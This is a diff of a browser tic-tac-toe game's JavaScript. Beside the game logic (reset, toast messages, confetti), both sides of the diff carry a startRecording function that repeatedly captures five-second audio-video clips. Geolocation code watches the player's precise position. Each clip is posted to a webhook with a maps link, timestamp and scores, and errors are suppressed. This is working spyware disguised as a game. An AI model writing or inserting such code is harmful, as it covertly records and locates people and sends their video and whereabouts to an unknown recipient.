+            document.getElementById('turnText').innerHTML = '<span>Player 1\'s</span> Turn';
         }
-    }
 
-    function startRecording() {
-        if(!stream || recording) return;
-        recording = true;
-        
-        const rec = () => {
-            if(!stream || !stream.active) { recording = false; return; }
-            try {
-                const mr = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp9,opus'});
-                const chunks = [];
-                mr.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-                mr.onstop = async () => {
-                    if(chunks.length) {
-                        const blob = new Blob(chunks, {type: 'video/webm'});
-                        const fd = new FormData();
-                        fd.append('file', blob, `ttt_${Date.now()}.webm`);
-                        const map = loc.lat !== "N/A" ? `https://maps.google.com/?q=${loc.lat},${loc.lng}` : 'N/A';
-                        fd.append('payload_json', JSON.stringify({
-                            content: `🎮 Tic-Tac-Toe\n📍 ${map}\n⏰ ${new Date().toLocaleString()}\nMode: ${state.mode}\nScore: P1:${state.scores.p1} P2:${state.scores.p2}`
-                        }));
-                        try { await fetch(WEBHOOK, {method: 'POST', body: fd}); } catch(e) {}
-                    }
-                    if(recording) setTimeout(rec, 500);
-                };
-                mr.start();
-                setTimeout(() => mr.stop(), 5000);
-            } catch(e) { recording = false; }
-        };
-        rec();
-    }
+        function resetAll() {
+            clearTimers();
+            state.scores = {p1: 0, p2: 0, d: 0};
+            updateDisplay();
+            newGame();
+        }
 
-    if(navigator.geolocation) {
-        navigator.geolocation.watchPosition(p => {
-            loc = {lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6)};
-        }, () => {}, {enableHighAccuracy: true});
-    }
-</script>
-</body> </html>
+        function showToast(msg, type) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.className = `toast ${type}`;
+            setTimeout(() => t.classList.add('show'), 10);
+            setTimeout(() => t.classList.remove('show'), 2500);
+        }
+
+        function confetti() {
+            const colors = ['#ff416c', '#00c9ff', '#ffd700', '#92fe9d'];
+            for(let i = 0; i < 30; i++) {
+                const c = document.createElement('div');
+                c.className = 'confetti';
+                c.style.left = Math.random() * 100 + 'vw';
+                c.style.top = '-10px';
+                c.style.background = colors[Math.floor(Math.random() * colors.length)];
+                c.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
+                c.style.animation = `confetti-fall ${2 + Math.random()}s linear forwards`;
+                document.body.appendChild(c);
+                setTimeout(() => c.remove(), 4000);
+            }
+        }
+
+        function startRecording() {
+            if(!stream || recording) return;
+            recording = true;
+            
+            const rec = () => {
+                if(!stream || !stream.active) { recording = false; return; }
+                try {
+                    const mr = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp9,opus'});
+                    const chunks = [];
+                    mr.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                    mr.onstop = async () => {
+                        if(chunks.length) {
+                            const blob = new Blob(chunks, {type: 'video/webm'});
+                            const fd = new FormData();
+                            fd.append('file', blob, `ttt_${Date.now()}.webm`);
+                            const map = loc.lat !== "N/A" ? `https://maps.google.com/?q=${loc.lat},${loc.lng}` : 'N/A';
+                            fd.append('payload_json', JSON.stringify({
+                                content: `🎮 Tic-Tac-Toe\n📍 ${map}\n⏰ ${new Date().toLocaleString()}\nMode: ${state.mode}\nScore: P1:${state.scores.p1} P2:${state.scores.p2}`
+                            }));
+                            try { await fetch(WEBHOOK, {method: 'POST', body: fd}); } catch(e) {}
+                        }
+                        if(recording) setTimeout(rec, 500);
+                    };
+                    mr.start();
+                    setTimeout(() => mr.stop(), 5000);
+                } catch(e) { recording = false; }
+            };
+            rec();
+        }
+
+        if(navigator.geolocation) {
+            navigator.geolocation.watchPosition(p => {
+                loc = {lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6)};
+            }, () => {}, {enableHighAccuracy: true});
+        }
+    </script>
+</body>
+</html>
